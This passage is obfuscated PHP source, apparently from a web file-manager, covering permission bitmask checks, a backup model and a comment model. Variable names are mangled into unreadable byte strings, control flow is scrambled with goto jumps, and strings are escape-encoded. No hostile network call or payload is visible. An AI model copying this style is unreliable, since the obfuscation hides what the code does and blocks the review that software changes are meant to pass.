self::AUTH_SHOW | self::AUTH_VIEW), array($FÖ„ÃÁ¬’¼[422] => LNG($FÖ„ÃÁ¬’¼[1706]), $FÖ„ÃÁ¬’¼[1695] => $FÖ„ÃÁ¬’¼[1707], $FÖ„ÃÁ¬’¼[1697] => 5, $FÖ„ÃÁ¬’¼[1698] => 1, $FÖ„ÃÁ¬’¼[1699] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($FÖ„ÃÁ¬’¼[422] => LNG($FÖ„ÃÁ¬’¼[1708]), $FÖ„ÃÁ¬’¼[1695] => $FÖ„ÃÁ¬’¼[1709], $FÖ„ÃÁ¬’¼[1697] => 6, $FÖ„ÃÁ¬’¼[1698] => 1, $FÖ„ÃÁ¬’¼[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($FÖ„ÃÁ¬’¼[422] => LNG($FÖ„ÃÁ¬’¼[1710]), $FÖ„ÃÁ¬’¼[1695] => $FÖ„ÃÁ¬’¼[1711], $FÖ„ÃÁ¬’¼[1697] => 7, $FÖ„ÃÁ¬’¼[1698] => 1, $FÖ„ÃÁ¬’¼[1699] => 0)); return $C…÷ÆÀÙÚ; } public static function authCheck($b‰ÑÙ­À­, $E“†öÓ—°Ç) { $b‰ÑÙ­À­ = intval($b‰ÑÙ­À­); if ($GLOBALS[$_SERVER[Ü˜][494]]) { return !0; } if ($b‰ÑÙ­À­ <= 0) { return !1; } if (($b‰ÑÙ­À­ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($b‰ÑÙ­À­ & $E“†öÓ—°Ç); } public static function authCheckShow($B®ìã¢ª–¼) { return self::authCheck($B®ìã¢ª–¼, self::AUTH_SHOW); } public static function authCheckView($FÎ§†À­Ô”) { return self::authCheck($FÎ§†À­Ô”, self::AUTH_VIEW); } public static function authCheckDownload($bÇŞ½‘¿†¢) { return self::authCheck($bÇŞ½‘¿†¢, self::AUTH_DOWNLOAD); } public static function authCheckUpload($BäÓ­²øù¾) { return self::authCheck($BäÓ­²øù¾, self::AUTH_UPLOAD); } public static function authCheckEdit($AÏÂØÍâôÂ) { return self::authCheck($AÏÂØÍâôÂ, self::AUTH_EDIT); } public static function authCheckRemove($AÆÇœïâ¦) { return self::authCheck($AÆÇœïâ¦, self::AUTH_REMOVE); } public static function authCheckShare($f„è—®¨¹ƒ) { return self::authCheck($f„è—®¨¹ƒ, self::AUTH_SHARE); } public static function authCheckComment($C¦‰ç¯„„¾) { return self::authCheck($C¦‰ç¯„„¾, self::AUTH_COMMENT); } public static function authCheckEvent($CïÔÀ–¹¬É) { return self::authCheck($CïÔÀ–¹¬É, self::AUTH_EVENT); } public static function authCheckRoot($d¦ÕìœÊì) { return self::authCheck($d¦ÕìœÊì, self::AUTH_ROOT); } public static function authCheckAction($a†´·ÕÑ““, $C‘Èìáœœ„) { goto EËç…È¨ ; EËç…È¨ : $eÀŸÍ£êÅ± =& $_SERVER[Ü˜]; $B´â»íßÏì = array($eÀŸÍ£êÅ±[1712] => self::AUTH_VIEW, $eÀŸÍ£êÅ±[1095] => self::AUTH_DOWNLOAD, $eÀŸÍ£êÅ±[117] => self::AUTH_UPLOAD, $eÀŸÍ£êÅ±[1660] => self::AUTH_EDIT, $eÀŸÍ£êÅ±[1659] => self::AUTH_REMOVE, $eÀŸÍ£êÅ±[1670] => self::AUTH_SHARE, $eÀŸÍ£êÅ±[361] => self::AUTH_COMMENT, $eÀŸÍ£êÅ±[1518] => self::AUTH_EVENT, $eÀŸÍ£êÅ±[1713] => self::AUTH_ROOT); if (!isset($B´â»íßÏì[$C‘Èìáœœ„])) { return; } goto eùñì½ñ”ô; eùñì½ñ”ô: $FŠÀ‡±ÜÜ• = $B´â»íßÏì[$C‘Èìáœœ„]; $a†´·ÕÑ““ = intval($a†´·ÕÑ““); if ($a†´·ÕÑ““ <= 0) { return !1; } goto dì±Šµß³ø; dì±Šµß³ø: if (($a†´·ÕÑ““ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($a†´·ÕÑ““ & $FŠÀ‡±ÜÜ•); goto A¨É´ŸŠÃÒ; A¨É´ŸŠÃÒ: } public static function authDisable($a×éáÉø’İ, $c·½¾‡Æ¤¦) { if (intval($a×éáÉø’İ) <= 0) { return 0; } return intval($a×éáÉø’İ) & ~$c·½¾‡Æ¤¦; } public $optionType = "\123\171\x73\164\145\155\x2e\x73\x6f\165\x72\x63\x65\x41\165\x74\150\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\141\x75\164\x68", "\x6c\x61\x62\x65\154", "\144\x69\163\x70\x6c\141\x79", "\x73\171\163\164\x65\155", "\163\157\x72\x74"); public function initData() { $Eùë¨µ‚ß = $this->authDefault(); foreach ($Eùë¨µ‚ß as $C‡°®¥–°Ù) { $this->add($C‡°®¥–°Ù); } } public function listData($EÛƒµ²¨©¸ = false, $A‘Å³¼Ÿ¼ = "\x73\x6f\162\164", $BñğÖîÅã = false) { return parent::listData($EÛƒµ²¨©¸, $A‘Å³¼Ÿ¼, $BñğÖîÅã); } public function update($BõšÎ‡ÚĞù, $eªÚ«Â¦ÀÖ) { $Bã£¦Œµ‚Ş =& $_SERVER[Ü˜]; $E…¶«Çæ„ = parent::listData($BõšÎ‡ÚĞù); $F³’‘ó«›ò = $this->findByName($eªÚ«Â¦ÀÖ[$Bã£¦Œµ‚Ş[28]]); if (!$E…¶«Çæ„ || $F³’‘ó«›ò && $F³’‘ó«›ò[$Bã£¦Œµ‚Ş[402]] != $E…¶«Çæ„[$Bã£¦Œµ‚Ş[402]]) { return !1; } $this->filterAuth($eªÚ«Â¦ÀÖ[$Bã£¦Œµ‚Ş[415]]); return parent::update($BõšÎ‡ÚĞù, $eªÚ«Â¦ÀÖ); } public function remove($aèµµÃ¦²ã) { $b§ÔœëĞ‚— = parent::listData($aèµµÃ¦²ã); if (!$b§ÔœëĞ‚— || $b§ÔœëĞ‚—[$_SERVER[Ü˜][1172]]) { return !1; } return parent::remove($aèµµÃ¦²ã); } public function add($AÉˆ¯î‡› = array()) { goto CƒîŒ×Ç™; FÆ¹ãµØßğ: return parent::insert($AÉˆ¯î‡›); goto B½¸­ĞÅ¹; CƒîŒ×Ç™: $b®‘‚ğØÓ£ =& $_SERVER[Ü˜]; if ($this->findByName($AÉˆ¯î‡›[$b®‘‚ğØÓ£[28]])) { return !1; } $C´…µÜŒŠÊ = array($b®‘‚ğØÓ£[28] => $b®‘‚ğØÓ£[33], $b®‘‚ğØÓ£[415] => 1, $b®‘‚ğØÓ£[1714] => $b®‘‚ğØÓ£[1703], $b®‘‚ğØÓ£[1715] => 1, $b®‘‚ğØÓ£[1172] => 0, $b®‘‚ğØÓ£[1716] => 0); goto dˆèœô»²¬; dˆèœô»²¬: $AÉˆ¯î‡› = array_merge($C´…µÜŒŠÊ, $AÉˆ¯î‡›); $AÉˆ¯î‡›[$b®‘‚ğØÓ£[1716]] = $this->getSort(); $this->filterAuth($AÉˆ¯î‡›[$b®‘‚ğØÓ£[415]]); goto FÆ¹ãµØßğ; B½¸­ĞÅ¹: } private function getSort() { $C½²è¢‰ç’ =& $_SERVER[Ü˜]; $BîÎÃƒƒ‰Ì = parent::listData(); $C½Á‰ Â„¸ = array_to_keyvalue($BîÎÃƒƒ‰Ì, $C½²è¢‰ç’[33], $C½²è¢‰ç’[1716]); return empty($C½Á‰ Â„¸) ? 0 : max($C½Á‰ Â„¸) + 1; } private function filterAuth(&$däÄÄÒš¿) { goto b¿ß§ë÷°÷; E²Šéê§ÉÙ: foreach ($e™·¼Õí„Ö as $c­‘¬š÷™‹) { if ($däÄÄÒš¿ & $c­‘¬š÷™‹) { $eÙ¬Ô•¿»[] = $c­‘¬š÷™‹; } } if (in_array(self::AUTH_ROOT, $eÙ¬Ô•¿»)) { $däÄÄÒš¿ = array_sum($e™·¼Õí„Ö); return; } $f‹ÜØ‹‚„ì = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Cç‰Ä¨§™ä; b¿ß§ë÷°÷: if (!$däÄÄÒš¿) { return; } $e™·¼Õí„Ö = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $eÙ¬Ô•¿» = array(); goto E²Šéê§ÉÙ; Cç‰Ä¨§™ä: foreach ($eÙ¬Ô•¿» as $c­‘¬š÷™‹) { if (isset($f‹ÜØ‹‚„ì[$c­‘¬š÷™‹])) { $eÙ¬Ô•¿» = array_merge($eÙ¬Ô•¿», $f‹ÜØ‹‚„ì[$c­‘¬š÷™‹]); } } $eÙ¬Ô•¿»[] = self::AUTH_SHOW; $däÄÄÒš¿ = array_sum(array_unique($eÙ¬Ô•¿»)); goto C¡Ã±…İ§†; C¡Ã±…İ§†: } public function sort($A…ó°õÍãí, $dø’èåÄ‰æ) { return parent::update($A…ó°õÍãí, $dø’èåÄ‰æ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x62\141\143\x6b\165\x70\x4c\x69\163\x74"; public $field = array("\151\157", "\x6e\141\x6d\x65", "\x73\164\141\164\165\163", "\143\157\x6e\x74\145\156\x74", "\155\x61\156\x75\141\154", "\162\145\x73\165\154\164", "\x74\151\x6d\145\106\162\x6f\155", "\x74\151\x6d\145\124\x6f"); public function config() { goto DÀ”®‰ëŠô; dÀªƒùõŠÙ: if (isset($D¬×±¯»ˆ[$dª§º¶·‹[207]])) { $C›Ûï¬å[$dª§º¶·‹[207]][$dª§º¶·‹[1503]] = $D¬×±¯»ˆ[$dª§º¶·‹[207]]; unset($D¬×±¯»ˆ[$dª§º¶·‹[207]]); } return array_merge($C›Ûï¬å, $D¬×±¯»ˆ); goto E¹â°”ùİ; açÌæÑšÊ£: Action($dª§º¶·‹[1717])->taskInit(); Model($dª§º¶·‹[1499])->cacheClear(); $E„µÔÕÏ¡» = $dª§º¶·‹[1718]; goto CğŸÄ¡Õ; b¸İˆ›ÑÃ×: $D¬×±¯»ˆ = is_array($D¬×±¯»ˆ) ? $D¬×±¯»ˆ : array(); if (!isset($D¬×±¯»ˆ[$dª§º¶·‹[724]])) { $D¬×±¯»ˆ[$dª§º¶·‹[724]] = $dª§º¶·‹[97]; } unset($D¬×±¯»ˆ[$dª§º¶·‹[1500]]); goto açÌæÑšÊ£; CğŸÄ¡Õ: $C›Ûï¬å = Model($dª§º¶·‹[1719])->findByKey($dª§º¶·‹[1518], $E„µÔÕÏ¡»); if (!$C›Ûï¬å) { $C›Ûï¬å = array(); } if (isset($C›Ûï¬å[$dª§º¶·‹[207]])) { $C›Ûï¬å[$dª§º¶·‹[207]] = json_decode($C›Ûï¬å[$dª§º¶·‹[207]], !0); } goto dÀªƒùõŠÙ; DÀ”®‰ëŠô: $dª§º¶·‹ =& $_SERVER[Ü˜]; $D¬×±¯»ˆ = Model($dª§º¶·‹[739])->get($dª§º¶·‹[751]); $D¬×±¯»ˆ = json_decode($D¬×±¯»ˆ, !0); goto b¸İˆ›ÑÃ×; E¹â°”ùİ: } public function listData($A•ªÀÚö‰ã = false, $E„İÕÑ·½· = "\155\x6f\x64\x69\x66\x79\124\x69\x6d\145", $EÕôõÍÖÒ = false) { return parent::listData($A•ªÀÚö‰ã, $E„İÕÑ·½·, !0); } public function lastItem() { $Dë¡‹ÓªŒƒ = $this->listData(); return !empty($Dë¡‹ÓªŒƒ[0]) ? $Dë¡‹ÓªŒƒ[0] : null; } public function kill($AÔßãÎïµ´) { goto D‚”‰Ğ³Òê; Eò’Ôèæíò: return $this->remove($AÔßãÎïµ´); goto aƒÏ»¹â–Ì; D‚”‰Ğ³Òê: $aºÌ´ËéÉ =& $_SERVER[Ü˜]; $Cã¤±Ã–¾ = $this->listData($AÔßãÎïµ´); if (!$Cã¤±Ã–¾ || empty($Cã¤±Ã–¾[$aºÌ´ËéÉ[28]])) { return !0; } goto DàÓé¨÷›; aÙ•¿ÔŞ¹: $Dò®à©ç¨„ = $Cã¤±Ã–¾[$aºÌ´ËéÉ[28]]; $a›¢”é‚ãƒ = TEMP_FILES . $aºÌ´ËéÉ[747] . $Dò®à©ç¨„ . $aºÌ´ËéÉ[8]; IO::remove($a›¢”é‚ãƒ, !1); goto Eò’Ôèæíò; DàÓé¨÷›: Task::kill($aºÌ´ËéÉ[750]); Task::kill($aºÌ´ËéÉ[773]); Task::kill($aºÌ´ËéÉ[783]); goto aÙ•¿ÔŞ¹; aƒÏ»¹â–Ì: } public function remove($eéˆš¤Û‰) { $aÍ¼±‚¹Õ· = $this->listData($eéˆš¤Û‰); if (!$aÍ¼±‚¹Õ·) { return !0; } return $this->backupRemove($aÍ¼±‚¹Õ·); } private function backupRemove($F­¤îëñŠ¦) { parent::remove($F­¤îëñŠ¦[$_SERVER[Ü˜][402]]); $F¢ã‘ó‹ = $this->backupPath($F­¤îëñŠ¦); IO::remove($F¢ã‘ó‹, !1); return !0; } private function backupPath($e¬ÚŠ„êšŞ) { $EöÓÓ¸„é¢ =& $_SERVER[Ü˜]; $E¾‡ĞÁ¤™È = $e¬ÚŠ„êšŞ[$EöÓÓ¸„é¢[28]]; $D¬çœÙ‰Ï¦ = Model($EöÓÓ¸„é¢[739])->get($EöÓÓ¸„é¢[740]); $BáîŞ³§ÓÍ = substr(md5($EöÓÓ¸„é¢[741] . $D¬çœÙ‰Ï¦ . $E¾‡ĞÁ¤™È), 0, 8); return "\x7b\x69\x6f\x3a{$e¬ÚŠ„êšŞ[$EöÓÓ¸„é¢[721]]}\175\x2f\x64\141\x74\141\142\x61\x73\145\x2f\142\x61\143\x6b\x75\160\57" . $E¾‡ĞÁ¤™È . $EöÓÓ¸„é¢[81] . $BáîŞ³§ÓÍ; } public function start() { goto dçô¡ÇÊ¶İ; bªôÀÛ©»¬: $DøİøÔ´åî = new Backup(); $eíÎ´Áñ‚Ò = $DøİøÔ´åî->db(); if ($eíÎ´Áñ‚Ò) { $eíÎ´Áñ‚Ò = $DøİøÔ´åî->dbFile(); if ($eíÎ´Áñ‚Ò && $a„†Ì§éŸ[$C‚×ê¡òô£[724]] == $C‚×ê¡òô£[201]) { $eíÎ´Áñ‚Ò = $DøİøÔ´åî->file(); } } goto e”Öóâò¸Î; dçô¡ÇÊ¶İ: $C‚×ê¡òô£ =& $_SERVER[Ü˜]; if ($GLOBALS[$C‚×ê¡òô£[6]][$C‚×ê¡òô£[98]][$C‚×ê¡òô£[1720]] != $C‚×ê¡òô£[97]) { return !0; } $a„†Ì§éŸ = $this->config(); goto f…õ‡Ùª–; e”Öóâò¸Î: Backup::set(array($C‚×ê¡òô£[719] => 1, $C‚×ê¡òô£[485] => time())); return !0; goto a§à·³¬Ä³; f…õ‡Ùª–: if (!$a„†Ì§éŸ || $a„†Ì§éŸ[$C‚×ê¡òô£[1500]] != $C‚×ê¡òô£[97]) { return !1; } $B¼¤ä¾°˜ = $this->process(); foreach ($B¼¤ä¾°˜ as $a¤ÕÙÕ˜¾æ) { if ($a¤ÕÙÕ˜¾æ) { return Task::restart($a¤ÕÙÕ˜¾æ[$C‚×ê¡òô£[402]]); } } goto bªôÀÛ©»¬; a§à·³¬Ä³: } public function process() { $BÖ¡á×œ¢Ä =& $_SERVER[Ü˜]; return array($BÖ¡á×œ¢Ä[727] => Task::get($BÖ¡á×œ¢Ä[750]), $BÖ¡á×œ¢Ä[731] => Task::get($BÖ¡á×œ¢Ä[773]), $BÖ¡á×œ¢Ä[203] => Task::get($BÖ¡á×œ¢Ä[783])); } public function restore() { $b”‰Œİå =& $_SERVER[Ü˜]; ActionCall($b”‰Œİå[1019], !0, 1); ActionCall($b”‰Œİå[1019], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\x61\x6d\x65" => "\143\x6f\155\155\145\156\164\137\x6d\145\x74\x61", "\155\x65\164\x61\106\151\145\154\144" => "\143\x6f\x6d\x6d\145\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($f¹…àÑÀÍ¬) { $E†ÈÊ¥Ùß¢ =& $_SERVER[Ü˜]; if ($f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[1721]]) { $cĞŞÉÎò—­ = $this->where(array($E†ÈÊ¥Ùß¢[1722] => $f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[1721]]))->find(); if (!$cĞŞÉÎò—­ || $cĞŞÉÎò—­[$E†ÈÊ¥Ùß¢[413]] != $f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[413]] || $cĞŞÉÎò—­[$E†ÈÊ¥Ùß¢[493]] != $f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[493]]) { return !1; } $this->where(array($E†ÈÊ¥Ùß¢[1722] => $f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[1721]]))->setAdd($E†ÈÊ¥Ùß¢[1723], 1); } $f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[1724]] = 0; $f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[1723]] = 0; $f¹…àÑÀÍ¬[$E†ÈÊ¥Ùß¢[719]] = 1; return $this->add($f¹…àÑÀÍ¬); } public function commentCount($C¨óêˆˆÈà, $c«…¡ô£„Ä) { goto CÑÂÇÙˆà; CÑÂÇÙˆà: $FÈºÒà¹®‹ =& $_SERVER[Ü˜]; if (!$C¨óêˆˆÈà) { return array(); } if (is_string($C¨óêˆˆÈà) || is_int($C¨óêˆˆÈà)) { $C¨óêˆˆÈà = array($C¨óêˆˆÈà); } goto d¬ƒÃŸ°Ô´; AØ…šÔ¶ÚÔ: return array_to_keyvalue($eÖäÍéÃó, $FÈºÒà¹®‹[493], $FÈºÒà¹®‹[489]); goto dÍ¼‘›À·ñ; d¬ƒÃŸ°Ô´: $A¦õøİÜç = array($FÈºÒà¹®‹[493], $FÈºÒà¹®‹[1725] => $FÈºÒà¹®‹[489]); $C‰áµ·é = array($FÈºÒà¹®‹[493] => array($FÈºÒà¹®‹[7], $C¨óêˆˆÈà), $FÈºÒà¹®‹[413] => $c«…¡ô£„Ä); $eÖäÍéÃó = $this->field($A¦õøİÜç)->where($C‰áµ·é)->group($FÈºÒà¹®‹[493])->select(); goto AØ…šÔ¶ÚÔ; dÍ¼‘›À·ñ: } public function remove($C¯ËĞ©¦ÎÑ) { $a © °¥ÙÌ =& $_SERVER[Ü˜]; $F¾¶¾ÃéÔĞ = array($a © °¥ÙÌ[1722] => $C¯ËĞ©¦ÎÑ); $A”Ü³—°¢¶ = $this->where($F¾¶¾ÃéÔĞ)->find(); if ($A”Ü³—°¢¶[$a © °¥ÙÌ[1721]]) { $this->where(array($a © °¥ÙÌ[1722] => $A”Ü³—°¢¶[$a © °¥ÙÌ[1721]]))->setAdd($a © °¥ÙÌ[1723], -1); } return $this->where($F¾¶¾ÃéÔĞ)->delete(); } public function edit($CİŞ½‹°Å¶, $Dñ©Ş¶°Ÿ) { $Bˆ’ÀÑ¹²„ =& $_SERVER[Ü˜]; $aÖÓŠ¹ŞÇÁ = array($Bˆ’ÀÑ¹²„[1722] => $CİŞ½‹°Å¶); return $this->where($aÖÓŠ¹ŞÇÁ)->save(array($Bˆ’ÀÑ¹²„[1726] => $Dñ©Ş¶°Ÿ)); } public function prasise($f•ñæĞ£øâ) { $A­‘æÉÏô¹ =& $_SERVER[Ü˜]; $AŠ…æõù‡ = Model($A­‘æÉÏô¹[1727]); $aâµ‹ÜË¡ = array($A­‘æÉÏô¹[1722] => $f•ñæĞ£øâ, $A­‘æÉÏô¹[1521] => USER_ID); $cœî²ÕÃ¸ø = $AŠ…æõù‡->where($aâµ‹ÜË¡)->find(); if (!$cœî²ÕÃ¸ø) { $AŠ…æõù‡->add($aâµ‹ÜË¡); $Bê‚œ§øˆ³ = $this->where(array($A­‘æÉÏô¹[1722] => $f•ñæĞ£øâ))->setAdd($A­‘æÉÏô¹[1724], 1); } else { $AŠ…æõù‡->where($aâµ‹ÜË¡)->delete(); $Bê‚œ§øˆ³ = $this->where(array($A­‘æÉÏô¹[1722] => $f•ñæĞ£øâ))->setAdd($A­‘æÉÏô¹[1724], -1); } return $Bê‚œ§øˆ³; } public function targetInfo($eçĞ¼–à‹Ñ, $FØâ¢©¦È) { goto c™õÀá‹êƒ; EÕã¿ãùòŒ: return $dÏÓá°Ï½Š; goto DìËñãŞö; c™õÀá‹êƒ: $c¨Êº…Òë =& $_SERVER[Ü˜]; $cï¨ƒíÎ = array($c¨Êº…Òë[558] => $eçĞ¼–à‹Ñ, $c¨Êº…Òë[559] => $FØâ¢©¦È); $c¡¤Ùğƒò = $this->where($cï¨ƒíÎ)->count(); goto d»ÒÙò÷·ä; d»ÒÙò÷·ä: $Fìšƒ…‹¢Ç = "\x52\111\107\x48\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\143\157\155\155\145\156\x74\137\160\x72\141\x69\x73\145\x20\163\164\x61\162\x20\x6f\x6e\40\x63\157\x6d\155\x65\x6e\164\56\143\x6f\155\155\145\x6e\164\x49\x44\x20\x3d\x20\x73\164\141\x72\x2e\143\157\155\x6d\145\156\164\x49\104"; $bĞ¹ùÅå³ = $this->alias($c¨Êº…Òë[361])->where($cï¨ƒíÎ)->join($Fìšƒ…‹¢Ç, $c¨Êº…Òë[1728])->count(); $dÏÓá°Ï½Š = array($c¨Êº…Òë[1729] => $c¡¤Ùğƒò, $c¨Êº…Òë[1730] => $bĞ¹ùÅå³); goto EÕã¿ãùòŒ; DìËñãŞö: } public function listData($E©öÍÎùÛ) { $Aò¿ğËì®¶ =& $_SERVER[Ü˜]; if (isset($E©öÍÎùÛ[$Aò¿ğËì®¶[1731]])) { if ($E©öÍÎùÛ[$Aò¿ğËì®¶[1731]]) { $E©öÍÎùÛ[$Aò¿ğËì®¶[1732]] = array($Aò¿ğËì®¶[972], intval($E©öÍÎùÛ[$Aò¿ğËì®¶[1731]])); } unset($E©öÍÎùÛ[$Aò¿ğËì®¶[1731]]); } if (isset($E©öÍÎùÛ[$Aò¿ğËì®¶[1733]])) { if ($E©öÍÎùÛ[$Aò¿ğËì®¶[1733]]) { $E©öÍÎùÛ[$Aò¿ğËì®¶[1732]] = array($Aò¿ğËì®¶[969], intval($E©öÍÎùÛ[$Aò¿ğËì®¶[1733]])); } unset($E©öÍÎùÛ[$Aò¿ğËì®¶[1733]]); } return $this->_listData($E©öÍÎùÛ); } private function _listData($c¬ØÅ°óŞà) { $FèâÕÙÆ÷¬ =& $_SERVER[Ü˜]; $cŒËéñİºÓ = $this->where($c¬ØÅ°óŞà)->_makeOrder()->selectPage(100); $this->_listAppendParent($cŒËéñİºÓ[$FèâÕÙÆ÷¬[376]]); $this->_listAppendUser($cŒËéñİºÓ[$FèâÕÙÆ÷¬[376]]); $this->_listAppendMeta($cŒËéñİºÓ[$FèâÕÙÆ÷¬[376]]); return $cŒËéñİºÓ; } private function _makeOrder() { $AÅ„‡½ÉŸÚ =& $_SERVER[Ü˜]; $eÊÜˆ¯”¾‰ = array($AÅ„‡½ÉŸÚ[1724], $AÅ„‡½ÉŸÚ[1723], $AÅ„‡½ÉŸÚ[204]); $f…¹ÅÍèõÉ = Input::get($AÅ„‡½ÉŸÚ[444], $AÅ„‡½ÉŸÚ[7], $AÅ„‡½ÉŸÚ[425], $eÊÜˆ¯”¾‰); $BÃ‹â’‰ĞÒ = Input::get($AÅ„‡½ÉŸÚ[445], $AÅ„‡½ÉŸÚ[7], $AÅ„‡½ÉŸÚ[1523], array($AÅ„‡½ÉŸÚ[1734], $AÅ„‡½ÉŸÚ[440])); $e¤¼„àÛñˆ = $f…¹ÅÍèõÉ . $AÅ„‡½ÉŸÚ[50] . $BÃ‹â’‰ĞÒ; return $this->order($e¤¼„àÛñˆ); } private function _listAppendParent(&$bîõÑªØù­) { goto fÅÈìñÈ÷¯; fÅÈìñÈ÷¯: $B¿à‰çÛÔ¨ =& $_SERVER[Ü˜]; $f¤¥áŞ…ó = array_unique(array_to_keyvalue($bîõÑªØù­, $B¿à‰çÛÔ¨[33], $B¿à‰çÛÔ¨[1721])); $f¤¥áŞ…ó = array_remove_value($f¤¥áŞ…ó, $B¿à‰çÛÔ¨[201]); goto A°‡Ğî„¡Ï; Dß»²³ãÂ: foreach ($bîõÑªØù­ as &$D‹å÷œ¾Î) { if (isset($C‘õ­ÂÎë[$D‹å÷œ¾Î[$B¿à‰çÛÔ¨[1721]]])) { $D‹å÷œ¾Î[$B¿à‰çÛÔ¨[1735]] = $C‘õ­ÂÎë[$D‹å÷œ¾Î[$B¿à‰çÛÔ¨[1721]]]; } } unset($D‹å÷œ¾Î); goto báêÀÅÔÆİ; A°‡Ğî„¡Ï: if (!$f¤¥áŞ…ó) { return; } $C‘õ­ÂÎë = $this->where(array($B¿à‰çÛÔ¨[1722] => array($B¿à‰çÛÔ¨[7], $f¤¥áŞ…ó)))->select(); $C‘õ­ÂÎë = array_to_keyvalue($C‘õ­ÂÎë, $B¿à‰çÛÔ¨[1732]); goto Dß»²³ãÂ; báêÀÅÔÆİ: } private function _listAppendUser(&$BÂØ¯““®ï) { goto d“×ÆÓĞ‘©; d“×ÆÓĞ‘©: $dÄòì†ª =& $_SERVER[Ü˜]; $F‹¾×‹‹áù = array_unique(array_to_keyvalue($BÂØ¯““®ï, $dÄòì†ª[33], $dÄòì†ª[1529])); $F‹¾×‹‹áù = array_remove_value($F‹¾×‹‹áù, $dÄòì†ª[201]); goto AŸö†íƒÒÆ; AŸö†íƒÒÆ: if (count($F‹¾×‹‹áù) == 0) { return; } foreach ($BÂØ¯““®ï as $fÇå¼Ùªœ) { if (isset($fÇå¼Ùªœ[$dÄòì†ª[1735]])) { $F‹¾×‹‹áù[] = $fÇå¼Ùªœ[$dÄòì†ª[1735]][$dÄòì†ª[1529]]; } } $b¥¦¨Şå¯ = Model($dÄòì†ª[515])->userListInfo($F‹¾×‹‹áù); goto cçäƒ¦ã¬•; cçäƒ¦ã¬•: foreach ($BÂØ¯““®ï as &$fÇå¼Ùªœ) { $fÇå¼Ùªœ[$dÄòì†ª[571]] = $b¥¦¨Şå¯[$fÇå¼Ùªœ[$dÄòì†ª[1529]]]; if (isset($fÇå¼Ùªœ[$dÄòì†ª[1735]])) { $fÇå¼Ùªœ[$dÄòì†ª[1735]][$dÄòì†ª[571]] = $b¥¦¨Şå¯[$fÇå¼Ùªœ[$dÄòì†ª[1735]][$dÄòì†ª[1529]]]; } } unset($fÇå¼Ùªœ); goto aë“åÁ¨°ğ; aë“åÁ¨°ğ: } private function _listAppendMeta(&$B¯Ö‹©ƒª¿) { goto AßÆšÒ’ß; E¸á½‡°èÜ: if (!$fÀŒøÍßÕ) { return !1; } foreach ($B¯Ö‹©ƒª¿ as &$EŞ¥™Œ¿«·) { $EŞ¥™Œ¿«·[$cË‘²ØÍĞš[454]] = $fÀŒøÍßÕ[$EŞ¥™Œ¿«·[$cË‘²ØÍĞš[1732]]]; if (isset($EŞ¥™Œ¿«·[$cË‘²ØÍĞš[1735]])) { $EŞ¥™Œ¿«·[$cË‘²ØÍĞš[1735]][$cË‘²ØÍĞš[454]] = $fÀŒøÍßÕ[$EŞ¥™Œ¿«·[$cË‘²ØÍĞš[1735]][$cË‘²ØÍĞš[1732]]]; } } unset($EŞ¥™Œ¿«·); goto A–¾ƒ¹²ó›; c¡½ƒäÍÖ‘: if (!$bò²±¿‹¯Ê) { return; } foreach ($B¯Ö‹©ƒª¿ as $EŞ¥™Œ¿«·) { if (isset($EŞ¥™Œ¿«·[$cË‘²ØÍĞš[1735]])) { $bò²±¿‹¯Ê[] = $EŞ¥™Œ¿«·[$cË‘²ØÍĞš[1735]][$cË‘²ØÍĞš[1732]]; } } $fÀŒøÍßÕ = $this->metaList($bò²±¿‹¯Ê); goto E¸á½‡°èÜ; AßÆšÒ’ß: $cË‘²ØÍĞš =& $_SERVER[Ü˜]; $bò²±¿‹¯Ê = array_unique(array_to_keyvalue($B¯Ö‹©ƒª¿, $cË‘²ØÍĞš[33], $cË‘²ØÍĞš[1732])); $bò²±¿‹¯Ê = array_remove_value($bò²±¿‹¯Ê, $cË‘²ØÍĞš[201]); goto c¡½ƒäÍÖ‘; A–¾ƒ¹²ó›: } private function metaList($cÏ¹ŠŸø‹†) { goto Fä¨á‘±Œ; dÑ‹Àº´¦Ä: return $f‚Ò•ÉÔì˜ ? $f‚Ò•ÉÔì˜ : array(); goto f•…×ğÖİ; Fä¨á‘±Œ: $cµ‰Ìš =& $_SERVER[Ü˜]; if (!$cÏ¹ŠŸø‹†) { return array(); } $d»Ôî×Ğ = array($cµ‰Ìš[1732] => array($cµ‰Ìš[7], $cÏ¹ŠŸø‹†)); goto CŞé¬‡ÁÏ—; CŞé¬‡ÁÏ—: $f‚Ò•ÉÔì˜ = Model($cµ‰Ìš[1736])->where($d»Ôî×Ğ)->select(); $f‚Ò•ÉÔì˜ = 